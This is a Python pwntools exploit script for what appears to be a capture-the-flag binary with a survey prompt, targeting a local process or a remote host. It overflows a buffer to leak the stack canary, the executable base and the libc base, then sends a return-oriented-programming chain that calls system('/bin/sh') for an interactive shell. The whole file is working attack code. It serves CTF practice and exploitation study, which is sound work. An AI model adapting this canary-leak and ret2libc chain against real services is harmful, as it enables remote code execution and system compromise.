from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "./chall_patched"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"
libc = ELF("./libc.so.6", checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p
        self.canary = 0

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def get_canary(self):
        p = self.p
        p.sendlineafter(b"Do you want to complete a survey?", b"y")
        pay = b"A"*10
        p.sendlineafter(b"Do you like ctf?", pay)
        p.recvline()
        p.recvline()
        leak = p.recvline()[:-7][::-1]
        leak = bytes_to_long(leak+b"\x00")
        log.info(f"canary 0x%x", leak)
        self.canary = leak
        pay = b"A"*10+p64(self.canary)
        p.sendlineafter(b"Aww :( Can you provide some extra feedback?", pay)

    def get_exe_address(self):
        p = self.p
        p.sendlineafter(b"Do you want to complete a survey?", b"y")
        pay = b"A"*25
        p.sendlineafter(b"Do you like ctf?", pay)
        p.recvline()
        p.recvline()
        leak = p.recvline()[::-1].strip()
        leak = bytes_to_long(leak)
        leak = (leak - (leak & 0xfff)) - 0x1000
        log.info(f"exe.address 0x%x", leak)
        exe.address = leak
        p.clean()
        pay = b"A"*10+p64(self.canary)
        p.sendline(pay)

    def ropper(self, content):
        p = self.p
        p.sendlineafter(b"Do you want to complete a survey?", b"y")
        p.sendlineafter(b"Do you like ctf?", b"y")
        p.recvlines(4)
        pay = b"A"*10+p64(self.canary)
        pay += b"A"*8
        pay += content
        p.sendline(pay)

    def get_libc_address(self):
        p = self.p
        r = ROP(exe)
        r.call(exe.sym['puts'], [exe.got['fgets']])
        r.call(exe.sym['main'])
        self.ropper(flat(r))
        leak = p.recvline().strip()[::-1]
        print(leak)
        leak = bytes_to_long(leak) - libc.sym['fgets']
        log.info("libc @ 0x%x", leak)
        libc.address = leak


x, p = init()
x.debug((
    # "break *getFeedback+75\nc\nc\n"
    # "break *getFeedback+193\nc\n"
    # "break *getFeedback+199\nc\n"
))
x.get_canary()
x.get_exe_address()
x.get_libc_address()

r = ROP(libc)
r.raw(r.find_gadget(['ret']))
r.call(libc.sym['system'], [libc.search(b"/bin/sh").__next__()])
x.ropper(flat(r))

p.interactive()
